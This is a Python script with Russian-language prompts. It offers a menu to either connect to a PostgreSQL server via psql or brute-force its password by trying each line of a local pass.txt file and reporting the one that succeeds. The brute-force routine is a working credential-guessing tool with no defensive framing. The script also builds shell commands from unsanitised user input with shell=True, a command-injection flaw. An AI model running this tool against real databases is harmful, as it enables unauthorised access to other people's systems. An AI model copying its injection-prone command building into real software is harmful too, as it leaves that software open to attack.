import subprocess
import sys
import os

def manual_input():
    host = input("Введите доменное имя или IP-адрес: ")
    port = input("Введите порт (оставьте пустым для порта по умолчанию 5432): ")
    if not port:
        port = "5432"
    username = input("Введите имя пользователя: ")
    database = input("Введите имя базы данных: ")
    password = input("Введите пароль: ")
    
    command = f"psql -h {host} -p {port} -U {username} -d {database}"
    os.environ['PGPASSWORD'] = password
    print(f"Выполняется команда: {command}")
    subprocess.run(command, shell=True)

def bruteforce():
    host = input("Введите доменное имя или IP-адрес: ")
    port = input("Введите порт (оставьте пустым для порта по умолчанию 5432): ")
    if not port:
        port = "5432"
    username = input("Введите имя пользователя: ")
    database = input("Введите имя базы данных: ")
    
    with open("pass.txt", "r") as file:
        passwords = file.readlines()
    
    for password in passwords:
        password = password.strip()
        command = f"psql -h {host} -p {port} -U {username} -d {database}"
        os.environ['PGPASSWORD'] = password
        print(f"Пробуем пароль: {password}")
        
        try:
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                print(f"Успешный вход! Пароль: {password}")
                return  # Останавливаем брутфорс, если пароль верный
            elif "password authentication failed" in result.stderr:
                print("Неверный пароль, пробуем следующий...")
            else:
                print(f"Ошибка: {result.stderr}")
                break
        except Exception as e:
            print(f"Ошибка при выполнении команды: {e}")
            break

def main_menu():
    print("1. Ручной ввод данных")
    print("2. Брутфорс пароля")
    choice = input("Выберите опцию (1 или 2): ")
    
    if choice == "1":
        manual_input()
    elif choice == "2":
        bruteforce()
    else:
        print("Неверный выбор. Пожалуйста, выберите 1 или 2.")
        main_menu()

if __name__ == "__main__":
    main_menu()
